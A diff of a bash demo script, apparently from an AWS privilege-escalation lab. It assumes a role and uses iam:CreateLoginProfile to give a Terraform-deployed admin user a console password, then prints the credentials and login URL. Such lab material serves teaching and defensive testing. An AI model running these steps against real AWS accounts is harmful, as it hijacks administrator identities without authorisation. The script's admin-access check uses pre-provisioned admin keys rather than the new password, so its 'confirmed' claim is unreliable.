@@ -1,9 +1,12 @@
 #!/bin/bash
 
 # Demo script for iam:CreateLoginProfile privilege escalation
-# This script demonstrates how a role with CreateLoginProfile permission can escalate to admin
+# This is a ROLE-BASED one-hop scenario
 
 set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,73 +15,84 @@ YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
 
 # Configuration
-PROFILE="pl-pathfinder-starting-user-prod"
-STARTING_USER="pl-pathfinder-starting-user-prod"
-PRIVESC_ROLE="pl-clp-clifford"
-ADMIN_USER="pl-clp-admin"
+STARTING_USER="pl-prod-clp-to-admin-starting-user"
+STARTING_ROLE="pl-prod-clp-to-admin-starting-role"
+ADMIN_USER="pl-prod-clp-to-admin-target-user"
 
 # Generate a random password suffix (8 characters)
-RANDOM_SUFFIX=$(openssl rand -hex 6)  # Generates 8 hex characters
-PASSWORD="PathfinderLabs123!${RANDOM_SUFFIX}"  # Password with random suffix for uniqueness
+RANDOM_SUFFIX=$(openssl rand -hex 4)
+PASSWORD="PathfinderLabs123!${RANDOM_SUFFIX}"
 
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}IAM CreateLoginProfile Privilege Escalation Demo${NC}"
-echo -e "${GREEN}========================================${NC}\n"
+echo -e "${GREEN}========================================${NC}"
+echo -e "${YELLOW}Role-Based One-Hop to Admin${NC}\n"
 
-# Step 1: Verify starting user identity
-echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
-CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
-echo "Current identity: $CURRENT_USER"
+# Step 1: Get credentials from Terraform output
+echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
+cd ../../../../../..  # Go to project root
 
-if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
-    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
-    echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
+# Get the module output
+MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_createloginprofile.value // empty')
+
+if [ -z "$MODULE_OUTPUT" ]; then
+    echo -e "${RED}Error: Could not find terraform output${NC}"
+    echo "Make sure you've deployed this scenario with: terraform apply"
     exit 1
 fi
-echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 2: Get account ID
-echo -e "${YELLOW}Step 2: Getting account ID${NC}"
-ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
-echo "Account ID: $ACCOUNT_ID"
-echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
+# Extract credentials and ARNs
+export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
+ADMIN_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_user_name')
+CONSOLE_LOGIN_URL=$(echo "$MODULE_OUTPUT" | jq -r '.console_login_url')
 
-# Step 3: Assume the privilege escalation role
-echo -e "${YELLOW}Step 3: Assuming role $PRIVESC_ROLE${NC}"
-ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
-echo "Role ARN: $ROLE_ARN"
-
-CREDENTIALS=$(aws sts assume-role \
-    --role-arn $ROLE_ARN \
-    --role-session-name demo-attack-session \
-    --profile $PROFILE \
-    --output json)
-
-# Extract credentials
-export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.Credentials.AccessKeyId')
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.Credentials.SecretAccessKey')
-export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Credentials.SessionToken')
-
-# Verify role assumption
-ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-echo "New identity: $ROLE_IDENTITY"
-
-if [[ ! $ROLE_IDENTITY == *"$PRIVESC_ROLE"* ]]; then
-    echo -e "${RED}Error: Failed to assume $PRIVESC_ROLE${NC}"
+if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
-echo -e "${GREEN}✓ Successfully assumed $PRIVESC_ROLE${NC}\n"
 
-# Step 4: Check if admin user already has a login profile
+echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
+
+cd - > /dev/null  # Return to scenario directory
+
+# Step 2: Verify identity as user
+echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "Current identity: $CURRENT_IDENTITY"
+
+if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
+    echo -e "${RED}Error: Not running as expected user${NC}"
+    exit 1
+fi
+echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
+
+# Step 3: Assume the starting role
+echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
+echo "Role ARN: $STARTING_ROLE_ARN"
+
+ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
+    --role-arn "$STARTING_ROLE_ARN" \
+    --role-session-name "clp-demo-session")
+
+# Update credentials to use assumed role
+export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
+
+echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
+
+# Step 4: Check if admin user has a login profile
 echo -e "${YELLOW}Step 4: Checking if admin user has a login profile${NC}"
-echo "Checking for existing login profile for user: $ADMIN_USER"
+echo "Admin user: $ADMIN_USER_NAME"
 
-if aws iam get-login-profile --user-name $ADMIN_USER &> /dev/null; then
-    echo -e "${RED}⚠ Login profile already exists for $ADMIN_USER${NC}"
-    echo "Please run ./cleanup_attack.sh first to remove the existing login profile"
+if aws iam get-login-profile --user-name $ADMIN_USER_NAME &> /dev/null; then
+    echo -e "${RED}⚠ Admin user already has a login profile${NC}"
+    echo -e "${YELLOW}This scenario may have already been run. Run cleanup_attack.sh first.${NC}"
     exit 1
 else
-    echo -e "${GREEN}✓ Confirmed: No login profile exists (ready for attack)${NC}"
+    echo -e "${GREEN}✓ Confirmed: Admin user has no login profile${NC}"
 fi
 echo ""
 
@@ -93,83 +107,66 @@ fi
 echo ""
 
 # Step 6: Create login profile for admin user
-echo -e "${YELLOW}Step 6: Creating login profile for admin user${NC}"
-echo "Creating console password for user: $ADMIN_USER"
+echo -e "${YELLOW}Step 6: Creating login profile via iam:CreateLoginProfile${NC}"
+echo "Creating console password for admin user: $ADMIN_USER_NAME"
 echo "Password: $PASSWORD"
 
 aws iam create-login-profile \
-    --user-name $ADMIN_USER \
+    --user-name $ADMIN_USER_NAME \
     --password "$PASSWORD" \
     --no-password-reset-required
 
-if [ $? -eq 0 ]; then
-    echo -e "${GREEN}✓ Successfully created login profile!${NC}"
-else
-    echo -e "${RED}Failed to create login profile${NC}"
-    exit 1
-fi
+echo -e "${GREEN}✓ Successfully created login profile for admin user!${NC}\n"
+
+# Wait for IAM propagation
+echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
+sleep 15
 echo ""
 
-# Step 7: Display console login information
-echo -e "${YELLOW}Step 7: Console login information${NC}"
-CONSOLE_URL="https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
-echo "Console login URL: $CONSOLE_URL"
-echo "Username: $ADMIN_USER"
-echo "Password: $PASSWORD"
-echo ""
+# Step 7: Verify admin access via console credentials
+echo -e "${YELLOW}Step 7: Verifying admin access with new credentials${NC}"
+echo "Testing admin permissions using admin user credentials..."
 
-# Step 8: Get admin user's access keys to verify admin access programmatically
-echo -e "${YELLOW}Step 8: Retrieving admin user's access keys for verification${NC}"
+# Get admin user credentials from terraform output
+ADMIN_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.admin_access_key_id')
+ADMIN_SECRET_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.admin_secret_access_key')
 
-# Get the access keys from Terraform outputs
-TERRAFORM_DIR="../../../../../.."  # Navigate to root directory
-pushd $TERRAFORM_DIR > /dev/null
+# Switch to admin user credentials
+export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
+export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+unset AWS_SESSION_TOKEN
 
-ACCESS_KEY_ID=$(terraform output -json | jq -r '.prod_one_hop_to_admin_iam_createloginprofile[0].admin_access_key_id.value' 2>/dev/null || echo "")
-SECRET_ACCESS_KEY=$(terraform output -json | jq -r '.prod_one_hop_to_admin_iam_createloginprofile[0].admin_secret_access_key.value' 2>/dev/null || echo "")
+# Verify we're the admin user
+ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
+echo "Admin user identity: $ADMIN_IDENTITY"
 
-popd > /dev/null
+# Test admin permissions
+echo "Testing admin permissions (listing IAM users)..."
+IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
+echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"
 
-if [ -z "$ACCESS_KEY_ID" ] || [ "$ACCESS_KEY_ID" == "null" ]; then
-    echo -e "${YELLOW}Note: Unable to retrieve access keys from Terraform outputs${NC}"
-    echo "You can verify admin access by logging into the AWS console with the credentials above"
-else
-    echo -e "${GREEN}✓ Retrieved admin user's access keys${NC}"
+echo "Testing S3 access..."
+aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"
 
-    # Step 9: Verify admin access using the admin user's credentials
-    echo -e "\n${YELLOW}Step 9: Verifying administrative access${NC}"
-    echo "Testing admin permissions with admin user's API credentials..."
+echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"
 
-    # Configure admin credentials
-    export AWS_ACCESS_KEY_ID=$ACCESS_KEY_ID
-    export AWS_SECRET_ACCESS_KEY=$SECRET_ACCESS_KEY
-    unset AWS_SESSION_TOKEN
-
-    # List IAM users (admin permission)
-    if aws iam list-users --max-items 3 --output table; then
-        echo -e "\n${GREEN}✓ Successfully listed IAM users - admin access confirmed!${NC}"
-    else
-        echo -e "${YELLOW}Could not verify via API, but console access is available${NC}"
-    fi
-fi
-
-echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+# Summary
 echo -e "${GREEN}========================================${NC}"
-echo -e "\n${YELLOW}Summary:${NC}"
-echo "1. Started as: $STARTING_USER"
-echo "2. Assumed role: $PRIVESC_ROLE (with CreateLoginProfile permission)"
-echo "3. Created login profile for: $ADMIN_USER"
-echo "4. Admin console access available at: $CONSOLE_URL"
-
-echo -e "\n${YELLOW}Attack artifacts:${NC}"
-echo "- Login profile created for user $ADMIN_USER"
-echo "- Console password set to: $PASSWORD"
-
-echo -e "\n${YELLOW}Next steps:${NC}"
-echo "1. Open the console URL in a browser: $CONSOLE_URL"
-echo "2. Login with username: $ADMIN_USER and password: $PASSWORD"
-echo "3. You now have full administrative access through the console!"
-
-echo -e "\n${RED}⚠ Warning: A login profile now exists for the admin user!${NC}"
-echo "Run ./cleanup_attack.sh to remove the login profile"
+echo -e "${GREEN}Attack Summary${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
+echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
+echo -e "Step 2: Used ${YELLOW}iam:CreateLoginProfile${NC} to create console password for $ADMIN_USER_NAME"
+echo -e "Step 3: Gained ${YELLOW}Administrator Access${NC} (both console and API)"
+echo -e "Result: ${GREEN}Administrator Access${NC}"
+echo ""
+echo -e "${YELLOW}Attack Path:${NC}"
+echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (CreateLoginProfile) → $ADMIN_USER_NAME → Admin"
+echo ""
+echo -e "${GREEN}Console Login Information:${NC}"
+echo -e "  URL: ${YELLOW}$CONSOLE_LOGIN_URL${NC}"
+echo -e "  Username: ${YELLOW}$ADMIN_USER_NAME${NC}"
+echo -e "  Password: ${YELLOW}$PASSWORD${NC}"
+echo ""
+echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to delete the login profile${NC}"
+echo ""
